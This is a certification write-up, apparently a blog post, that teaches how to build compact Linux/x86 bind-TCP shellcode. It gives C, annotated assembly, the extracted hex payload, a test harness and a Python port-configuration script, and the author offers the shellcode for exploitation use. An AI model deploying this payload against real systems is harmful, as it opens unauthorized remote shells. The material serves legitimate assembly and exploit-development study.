---
title: 'SLAE: Shell Bind TCP Shellcode (Linux/x86)'
categories:
- Certifications
---
Do you like uncommon challenges? At least I do, and that's the reason why I've signed up for the [SecurityTube Linux Assembly Expert](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) training. But what's this all about ? The founder Vivek Ramachandran summarizes it best:

> The SecurityTube Linux Assembly Expert (SLAE) aims to teach the basics of assembly language on the Linux platform from a security perspective and its application to writing shellcode, encoders, decoders and crypters, among other things.

This training doesn't include one of those boring brain-dump style exams, which you encounter quite often in the information technology business, instead it's a bit like the OSCP exam - you have to challenge a practical exam to pass the certification. This exam includes 7 different challenges with varying difficulty, you have to solve by presenting your solution in a blog-style format. So this article is the first in a series about my SLAE assignments.

### Assignment #1: Shell Bind TCP Shellcode

The first assignment is to create a Linux shellcode which:

*   binds to a port via TCP
*   execs a shell on incoming connection
*   is easily configurable (in regards to the port)

To solve this assignment I've used one really excellent resource when it comes to linux syscalls: [http://syscalls.kernelgrok.com](http://syscalls.kernelgrok.com/). It's really worth a look!

Before you read any further, I'd just like to point out two things:

1.  My final shellcode for this assignment is **89 bytes** in length! My general intention when it comes to shellcoding is always to create them as small as possible. There are a few bind shellcodes out there which are bigger in size, because they care about things like SO_REUSEADDR, which is totally fine if you have enough room in an exploitation scenario for it! (If not, use mine instead ;-) )
2.  My shellcode is register-aware! This means, it makes no difference which values are in the different registers at the time of exploitation, because I'm cleaning them up before their usage using different techniques :-)

In addition, you can find all my scripts and source codes related to the SLAE in [my github account](https://github.com/rcesecurity/slae).

### Shell Bind TCP PoC

To understand how the final shellcode should look like, it's first quite helpful to create a correlation of the code in a higher language like C:

{% highlight cpp %}
// SLAE - Assignment #1: Shell Bind TCP (Linux/x86) PoC
// Author:  Julien Ahrens (@MrTuxracer)
// Website:  https://www.rcesecurity.com 

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
	int i; // used for dup2 later
	int sockfd; // socket file descriptor
	int clientfd; // client file descriptor
	socklen_t socklen; // socket-length for new connections

	struct sockaddr_in srv_addr; // server aka listen address
	struct sockaddr_in cli_addr; // client address

	srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
	srv_addr.sin_port = htons( 1337 ); // server port, converted to network byte order
	srv_addr.sin_addr.s_addr = htonl (INADDR_ANY); // listen on any address, converted to network byte order

	// create new TCP socket
	sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

	// bind socket
	bind( sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr) );

	// listen on socket
	listen(sockfd, 0);

	// accept new connections
	socklen = sizeof(cli_addr);
	clientfd = accept(sockfd, (struct sockaddr *)&cli_addr, &socklen );

	// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
	for(i = 0; i <= 2; i++)
		dup2(clientfd, i);

	// magic
	execve( "/bin/sh", NULL, NULL );
}
{% endhighlight %}

I think I do not need to analyse this source code in detail (as I have commented every line).

### Assembly preparation

According to the C source code, the following function calls need to be translated into assembly:

1.  Create a socket
2.  Bind it to an address/port
3.  Listen for incoming connections
4.  Accept a new connection
5.  Redirect stdin, stdout and stderr via dup2
6.  Execve a /bin/sh

### Create a socket via SYS_SOCKET

Using the mentioned linux syscall reference list, you quickly figure out that you need syscall 0x66 (SYS_SOCKETCALL) to basically work with sockets.

Instead of XOR'ing the EAX and EBX registers and MOV'ing the appropriate values into them, there is a more cost-efficient way using a PUSH/POP combination (yes this really saves a byte ;-) ):

{% highlight asm %}
; int socketcall(int call, unsigned long *args);
; sockfd = socket(int socket_family, int socket_type, int protocol);
;
push 0x66 
pop eax ;syscall: sys_socketcall + cleanup eax register
{% endhighlight %}

The next important part - the different functions calls of the socketcall syscall can be found in /usr/include/linux/net.h:

{% highlight cpp %}
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_CONNECT     3               /* sys_connect(2)               */
#define SYS_LISTEN      4               /* sys_listen(2)                */
#define SYS_ACCEPT      5               /* sys_accept(2)                */
#define SYS_GETSOCKNAME 6               /* sys_getsockname(2)           */
#define SYS_GETPEERNAME 7               /* sys_getpeername(2)           */
#define SYS_SOCKETPAIR  8               /* sys_socketpair(2)            */
#define SYS_SEND        9               /* sys_send(2)                  */
#define SYS_RECV        10              /* sys_recv(2)                  */
#define SYS_SENDTO      11              /* sys_sendto(2)                */
#define SYS_RECVFROM    12              /* sys_recvfrom(2)              */
#define SYS_SHUTDOWN    13              /* sys_shutdown(2)              */
#define SYS_SETSOCKOPT  14              /* sys_setsockopt(2)            */
#define SYS_GETSOCKOPT  15              /* sys_getsockopt(2)            */
#define SYS_SENDMSG     16              /* sys_sendmsg(2)               */
#define SYS_RECVMSG     17              /* sys_recvmsg(2)               */
#define SYS_ACCEPT4     18              /* sys_accept4(2)               */
#define SYS_RECVMMSG    19              /* sys_recvmmsg(2)              */
#define SYS_SENDMMSG    20              /* sys_sendmmsg(2)              */
{% endhighlight %}

According to that list you need to start with SYS_SOCKET (0x1), so another combination of PUSH/POP leads to a 0x1 in EBX:

{% highlight asm %}
push 0x1
pop ebx ;sys_socket (0x1) + cleanup ebx register
{% endhighlight %}

The socket() call basically takes 3 arguments and returns a socket file descriptor:

{% highlight cpp %}
sockfd = socket(int socket_family, int socket_type, int protocol);
{% endhighlight %}

To setup a proper socket() call, you need to check different header files to find the definitions for the arguments:

/usr/include/linux/in.h:

{% highlight cpp %}
IPPROTO_IP = 0, /* Dummy protocol for TCP */
{% endhighlight %}

/usr/include/bits/socket_type.h:

{% highlight cpp %}
SOCK_STREAM = 1, /* Sequenced, reliable, connection-based byte streams.  */
{% endhighlight %}

/usr/include/bits/socket.h:

{% highlight cpp %}
#define PF_INET         2       /* IP protocol family.  */
#define AF_INET         PF_INET
{% endhighlight %}

Using these, you can push the different arguments (socket_family, socket_type, protocol) onto the stack after cleaning up the ESI register:

{% highlight asm %}
xor esi, esi ;cleanup esi register

push esi ;protocol=IPPROTO_IP (0x0)
push ebx ;socket_type=SOCK_STREAM (0x1)
push 0x2 ;socket_family=AF_INET
{% endhighlight %}

...and since ECX needs to hold a pointer to this structure, a copy of the ESP is required:

{% highlight asm %}
mov ecx, esp ;save pointer to socket() args
{% endhighlight %}

Finally you can execute the syscall:

{% highlight asm %}
int 0x80 ;exec SYS_SOCKET
{% endhighlight %}

which returns a socket file descriptor to EAX. As the subsequent functions rely on this socket file descriptor, you need to put it in an unused register, where you can later pull it from again to work with it. This is needed because every subsequent call will save its result to EAX an therefore would overwrite the socket file descriptor. So moving it to another register like the EDI is required!

Since you cannot guarantee that the EDI register is controlable in an exploitation scenario, you need to fill it with something before. In this case POPing 0x2 from the stack is quite useful, because you need it in the next syscall:

{% highlight asm %}
pop edi ;cleanup register for xchg
xchg edi, eax; save result (sockfd) for later usage
{% endhighlight %}

(Using XCHG at this point saves another byte in comparison to a MOV instruction)

### Bind it to an address/port via SYS_BIND

Great. Now there is a socket file descriptor to work with. Up next, you have to bind the socket to an ip address/port combination using SYS_BIND.

Due to the last XCHG instruction EAX now contains 0x2, which is a perfect match, because EBX needs to be 0x2:

{% highlight asm %}
; int socketcall(int call, unsigned long *args);
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
;
xchg ebx, eax ;sys_bind (0x2)
mov al, 0x66 ;syscall: sys_socketcall
{% endhighlight %}

Therefore bind() takes three arguments, and one of them needs a special attention: const struct sockaddr:

{% highlight cpp %}
struct sockaddr_in {
	  __kernel_sa_family_t  sin_family;     /* Address family               */
	  __be16                sin_port;       /* Port number                  */
	  struct in_addr        sin_addr;       /* Internet address             */
	};
{% endhighlight %}

It's pretty obvious that you need to define this first - as we need a pointer to that structure on stack and take care of the argument order (remember that you **PUSH** the arguments onto the stack, so if you'd first PUSH the addrlen and then PUSH the different sockaddr_in arguments, this would result in a segmentation fault, because the argument order doesn't match the expected function order anymore!).

So the arguments are as follows:

{% highlight asm %}
push esi         ;sin_addr=0 (INADDR_ANY)
push word 0x3905 ;sin_port=1337 (network byte order)
push word bx     ;sin_family=AF_INET (0x2)
mov ecx, esp     ;save pointer to sockaddr_in struct
{% endhighlight %}

The first argument needs to be addrlen! Followed by the sockaddr pointer and the sockfd (stored in EDX due to the first XCHG):

{% highlight asm %}
push 0x10 ;addrlen=16
push ecx  ;struct sockaddr pointer
push edi  ;sockfd

mov ecx, esp ;save pointer to bind() args
{% endhighlight %}

Last but not least:

{% highlight asm %}
int 0x80 ;exec SYS_BIND
{% endhighlight %}

### Listen for incoming connections via SYS_LISTEN

Now that you have a bind, let's listen for incoming connections via SYS_LISTEN:

{% highlight asm %} ;
 ; int socketcall(int call, unsigned long *args);
 ; int listen(int sockfd, int backlog);
 ;
 mov al, 0x66 ;syscall 102 (sys_socketcall)
 mov bl, 0x4  ;sys_listen
{% endhighlight %}

listen() takes 2 arguments, that are pretty straight forward:

{% highlight asm %}
push esi ;backlog=0
push edi ;sockfd

mov ecx, esp ;save pointer to listen() args
{% endhighlight %}

and finally:

{% highlight asm %}
int 0x80 ;exec SYS_LISTEN
{% endhighlight %}

### Accept a new connection via SYS_ACCEPT

A listen() feels lonely without an accept():

{% highlight asm %}
; int socketcall(int call, unsigned long *args);
; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
;	
mov al, 0x66 ;syscall: sys_socketcall
inc ebx      ;sys_accept (0x5)
{% endhighlight %}

As you're accepting a new client-side connection, the arguments for accept() are a bit easier than for the bind call before: PUSH a 0x0 for addrlen and sockaddr, since you do not need to know anything about the client, followed by the socket file descriptor:

{% highlight asm %}
push esi ;addrlen=0
push esi ;addr=0
push edi ;sockfd

mov ecx, esp ;save pointer to accept() args
{% endhighlight %}

finally execute the syscall, which returns a socket file descriptor for the client into EAX, when a connection comes in:

{% highlight asm %}
int 0x80 ;exec sys_accept
{% endhighlight %}

### Redirect stdin, stdout and stderr via SYS_DUP2

To "see" something in your upcoming shell, you have to redirect stdin (0), stdout (1) and stderr(2) to the client socket file descriptor. This can be accomplished by using the SYS_DUP2 syscall 3 times (e.g. in a loop).

But before digging deeper into the SYS_DUP2 calls, the ECX register needs to be prepared for the loop. To better understand the next part, let's first have a look at the current stack layout:

[![linux_x86_shell_bind_tcp-7]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-7.png)]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-7.png)

Due to the  preceding pushes, the stack layout contains the socket file descriptor 0x00000007 and two times 0x00000000\. This is getting quite important, because you can use this stack-layout to proceed with the next two syscalls.

Therefore, POPing ECX two times will return 0x00000000 into ECX:

{% highlight asm %}
pop ecx ;dummy-pop to get to the next 0x0
pop ecx ;make sure that ecx contains 0x0 to get the next mov working (sockfd might be greater that 0xFF)
{% endhighlight %}

Now the start-counter can be moved into CL:

{% highlight asm %}
mov cl, 0x2 ;initiate counter
{% endhighlight %}

Since the result of each call is returned into EAX, it currently holds the client socket file descriptor (due to the sys_accept), and you have to save this to EBX using XCHG. EBX containt 0x5 due to the last syscall, so you can make sure, that if the socket file descriptor is bigger than 0xFF, the next lower register MOV will do it's job!

{% highlight asm %}
xchg ebx,eax ;save clientfd
{% endhighlight %}

dup2 takes 2 arguments:

{% highlight cpp %}
int dup2(int oldfd, int newfd);
{% endhighlight %}

whereas oldfd (EBX) is the client socket file descriptor and newfd is used with stdin(0), stdout(1) and stderr(2). The sys_dup2 syscall is executed three times in an ECX-based loop:

{% highlight asm %};
loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
loop:
 mov al, 0x3f ;syscall: sys_dup2 
 int 0x80     ;exec sys_dup2
 dec ecx      ;decrement loop-counter
 jns loop     ;as long as SF is not set -> jmp to loop
{% endhighlight %}

Here's the next trick to reduce the shellcode size. A decrementing counter using ECX and a JNS condition. JNS basically jumps to "loop" as long as the signed flag (SF) is not set. CL is initiated with a value of 0x2 - let's have a look at how the SF trigger is working:

[![linux_x86_shell_bind_tcp-8]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-8.png)]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-8.png)

After the third DEC ECX, it contains 0xffffffff aka -1 and the SF got set and the shellcode flow continues.

### Execve a /bin//sh via SYS_EXECVE

Now you have redirected stdin, stdout and stderr to the client socket file descriptor, the last thing you have to do is executing a /bin/sh:

{% highlight asm %}
; int execve(const char *filename, char *const argv[],char *const envp[]);
;
mov al, 0x0b ;syscall: sys_execve
{% endhighlight %}

Execve() takes 3 arguments, and just one of them is interesting: filename. So you need a pointer to the filename, you'd like to execute in EBX, which has to be in reverse order due to little endianess and terminated by a NULL, which is luckily already on the stack - have a look at the last screenshot ;-)

{% highlight asm %}
terminating NULL is already on the stack
push 0x68732f2f	;"hs//"
push 0x6e69622f	;"nib/"

mov ebx, esp ;save pointer to filename
{% endhighlight %}

Finally ECX and EDX need to be adjusted to contain 0x0\. ECX just by incrementing (it contains 0xffffffff due to the dec-loop) and edx by a simple MOV:

{% highlight asm %}
inc ecx      ;argv=0, ecx is 0xffffffff (+SF is set)
mov edx, ecx ;make sure edx contains 0
{% endhighlight %}

and last but not least execute the magic:

{% highlight asm %}
int 0x80 ; exec sys_execve
{% endhighlight %}

DONE :-) !

### Complete shellcode

Here's my complete, commented shellcode - **currently at a size of 89 bytes** :-)

{% highlight asm %}
; SLAE - Assignment #1: Shell Bind TCP Shellcode (Linux/x86)
; Author:  Julien Ahrens (@MrTuxracer)
; Website:  https://www.rcesecurity.com

global _start			

section .text
_start:
	;
	; int socketcall(int call, unsigned long *args);
	; sockfd = socket(int socket_family, int socket_type, int protocol);
	;
	push 0x66 
	pop eax ;syscall: sys_socketcall + cleanup eax register

	push 0x1
	pop ebx ;sys_socket (0x1) + cleanup ebx register

	xor esi, esi ;cleanup esi register

	push esi ;protocol=IPPROTO_IP (0x0)
	push ebx ;socket_type=SOCK_STREAM (0x1)
	push 0x2 ;socket_family=AF_INET (0x2)

	mov ecx, esp ;save pointer to socket() args

	int 0x80 ;exec sys_socket

	pop edi ;cleanup register for xchg

	xchg edi, eax; save result (sockfd) for later usage

	;
	; int socketcall(int call, unsigned long *args);
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	;
	xchg ebx, eax ;sys_bind (0x2)
	mov al, 0x66 ;syscall: sys_socketcall

	;struct sockaddr_in {
	;  __kernel_sa_family_t  sin_family;     /* Address family               */
	;  __be16                sin_port;       /* Port number                  */
	;  struct in_addr        sin_addr;       /* Internet address             */
	;};

	push esi         ;sin_addr=0 (INADDR_ANY)
	push word 0x3905 ;sin_port=1337 (network byte order)
	push word bx     ;sin_family=AF_INET (0x2)
	mov ecx, esp     ;save pointer to sockaddr_in struct

	push 0x10 ;addrlen=16
	push ecx  ;struct sockaddr pointer
	push edi  ;sockfd

	mov ecx, esp ;save pointer to bind() args

	int 0x80 ;exec sys_bind

	;
	; int socketcall(int call, unsigned long *args);
	; int listen(int sockfd, int backlog);
	;
	mov al, 0x66 ;syscall 102 (sys_socketcall)
	mov bl, 0x4  ;sys_listen

	push esi ;backlog=0
	push edi ;sockfd

	mov ecx, esp ;save pointer to listen() args

	int 0x80 ;exec sys_listen

	;
	; int socketcall(int call, unsigned long *args);
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	;	
	mov al, 0x66 ;syscall: sys_socketcall
	inc ebx      ;sys_accept (0x5) 

	push esi ;addrlen=0
	push esi ;addr=0
	push edi ;sockfd	

	mov ecx, esp ;save pointer to accept() args

	int 0x80 ;exec sys_accept

	;
	; int socketcall(int call, unsigned long *args);
	; int dup2(int oldfd, int newfd);
	;
	pop ecx ;dummy-pop to get to the next 0x0
	pop ecx ;make sure that ecx contains 0x0 to get the next mov working (sockfd might be greater that 0xFF)
	mov cl, 0x2 ;initiate counter

	xchg ebx,eax ;save clientfd 
; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
loop:
	mov al, 0x3f ;syscall: sys_dup2 
	int 0x80     ;exec sys_dup2
	dec ecx	     ;decrement loop-counter
	jns loop     ;as long as SF is not set -> jmp to loop

	;
	; int execve(const char *filename, char *const argv[],char *const envp[]);
	;
	mov al, 0x0b ;syscall: sys_execve

	;terminating NULL is already on the stack
	push 0x68732f2f	;"hs//"
	push 0x6e69622f	;"nib/"

	mov ebx, esp ;save pointer to filename

	inc ecx      ;argv=0, ecx is 0xffffffff (+SF is set)
	mov edx, ecx ;make sure edx contains 0

	int 0x80 ; exec sys_execve
{% endhighlight %}

### Test the shellcode

The first step to test the shellcode is to assemble/link it and then extract the shellcode using a little [commandlinefu](http://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump):

{% highlight asm %}
objdump -d ./linux_x86_shell_bind_tcp.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
{% endhighlight %}

Now you can place the shellcode in a C - template, like this:

{% highlight cpp %}
#include<stdio.h>

unsigned char shellcode[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80";

main()
{
	printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
	int (*ret)() = (int(*)())shellcode;
	ret();
}
{% endhighlight %}

compile it:

{% highlight bash %}
gcc shellcode.c -o linux_x86_shell_bind_tcp -fno-stack-protector -z execstack -m32
{% endhighlight %}

run it:

[![linux_x86_shell_bind_tcp-1]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-1.png)]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-1.png)

verify if the port is open:

[![linux_x86_shell_bind_tcp-2]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-2.png)]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-2.png)

and netcat to the port to test if the /bin/sh is responding as intended:

[![linux_x86_shell_bind_tcp-3]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-3.png)]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-3.png)

Additionally you can run strace to verify which calls are executed and correlate this to the C source code. As you can see: socket, bind, listen, accept, 3x dup2 and finishing execve are executed properly:

[![linux_x86_shell_bind_tcp-4]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-4.png)]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-4.png)

### Port-Configuration

The last part of the assignment is to make the port easily configurable. So here's a little Python wrapper-script which accepts the port as a commandline-argument and generates the appropriate shellcode out of it. It takes care about the lower ports (<1024) as they are intended for root-usage only, and about 0x00 values as they would break the shellcode or exploit:

{% highlight python %}
#!/usr/bin/python

# SLAE - Assignment #1: Shell Bind TCP Shellcode (Linux/x86) Wrapper
# Author:  Julien Ahrens (@MrTuxracer)
# Website:  https://www.rcesecurity.com 

import sys

total = len(sys.argv)
if total != 2:
	print "Fail!"
else:
	try:
		port = int(sys.argv[1])
		if port > 65535:
			print "Port is greater than 65535!"
			exit()
		if port < 1024:
			print "Port is smaller than 1024! Remember u need r00t for this ;)"
			exit()			
		hp = hex(port)[2:]
		if len(hp) < 4:
			hp = "0" + hp

		print "Hex value of port: " + hp

		b1 = hp[0:2]
		b2 = hp[2:4] 

		if b1 == "00" or b2 == "00":
			print "Port contains \x00!"
			exit()

		if len(b1) < 2:
			b1="\x0" + b1
		if len(b1) == 2:
			b1="\x" + b1
		if len(b2) < 2:
			b2="\x0" + b2
		if len(b2) == 2:
			b2="\x" + b2

		shellport=b1+b2

		print "Shellcode-ready port: " + shellport

		shellcode = ("\x6a\x66\x58\x6a\x01\x5b\x31\xf6"+
		"\x56\x53\x6a\x02\x89\xe1\xcd\x80"+
		"\x5f\x97\x93\xb0\x66\x56\x66\x68"+
		shellport+"\x66\x53\x89\xe1\x6a\x10"+
		"\x51\x57\x89\xe1\xcd\x80\xb0\x66"+
		"\xb3\x04\x56\x57\x89\xe1\xcd\x80"+
		"\xb0\x66\x43\x56\x56\x57\x89\xe1"+
		"\xcd\x80\x59\x59\xb1\x02\x93\xb0"+
		"\x3f\xcd\x80\x49\x79\xf9\xb0\x0b"+
		"\x68\x2f\x2f\x73\x68\x68\x2f\x62"+
		"\x69\x6e\x89\xe3\x41\x89\xca\xcd"+
		"\x80")

		print "Final shellcode:\r\b\"" + shellcode + "\""

	except:
		print "exiting..."
{% endhighlight %}

The Python script echoes the new shellcode, so it can be used directly

[![linux_x86_shell_bind_tcp-5]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-5.png)]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-5.png)

by inserting it into the C-template and test it again:

[![linux_x86_shell_bind_tcp-6]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-6.png)]({{ site.baseurl }}/assets/linux_x86_shell_bind_tcp-6.png)

et voila :-)!

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[<span style="color: #2f2f2f;">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</span>](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE- 497
